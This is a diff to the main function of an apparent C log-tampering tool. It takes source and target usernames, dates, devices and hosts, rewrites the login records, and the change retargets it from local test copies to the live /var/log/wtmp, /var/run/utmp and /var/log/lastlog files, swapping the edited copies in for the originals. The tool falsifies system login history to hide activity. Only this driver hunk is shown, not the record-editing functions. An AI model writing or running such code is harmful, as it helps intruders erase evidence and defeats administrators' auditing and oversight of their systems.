@@ -336,25 +336,29 @@ int main(int argc, char **argv) {
     printf("src_host: %s, tgt_host: %s\n", src_host, tgt_host);
 
 
-    strncpy(filename, "./wtmp", 7);
-    strncpy(filename_new, "./wtmp_new", 11);
-    strncpy(filename_new_wtmp, "./wtmp_new", 11);
+    strncpy(filename, "/var/log/wtmp", 14);
+    strncpy(filename_new, "/var/log/wtmp_new", 18);
+    strncpy(filename_new_wtmp, "/var/log/wtmp_new", 18);
     process_tmp(filename, filename_new, is_replace, src_username, tgt_username, src_day, tgt_day, src_device, tgt_device, src_host, tgt_host);
     // read_tmp(filename, filename_new);
 
-    strncpy(filename, "./utmp", 7);
-    strncpy(filename_new, "./utmp_new", 11);
+    strncpy(filename, "/var/run/utmp", 14);
+    strncpy(filename_new, "/var/run/utmp_new", 18);
     process_tmp(filename, filename_new, is_replace, src_username, tgt_username, src_day, tgt_day, src_device, tgt_device, src_host, tgt_host);
 
-    strncpy(filename, "./lastlog", 10);
-    strncpy(filename_new, "./lastlog_new", 14);
+    strncpy(filename, "/var/log/lastlog", 17);
+    strncpy(filename_new, "/var/log/lastlog_new", 21);
     process_lastlog(filename, filename_new, filename_new_wtmp, is_replace, src_username, tgt_username);
     // read_lastlog(filename, filename_new);
 
-    rename("./wtmp", "./wtmp_backup");
-    rename("./wtmp_new", "./wtmp");
-    rename("./utmp", "./utmp_backup");
-    rename("./utmp_new", "./utmp");
+    rename("/var/log/lastlog", "/var/log/lastlog_backup");
+    rename("/var/log/lastlog_new", "/var/log/lastlog");
+
+    rename("/var/log/wtmp", "/var/log/wtmp_backup");
+    rename("/var/log/wtmp_new", "/var/log/wtmp");
+
+    rename("/var/run/utmp", "/var/run/utmp_backup");
+    rename("/var/run/utmp_new", "/var/run/utmp");
 
     free(src_username);
     free(tgt_username);
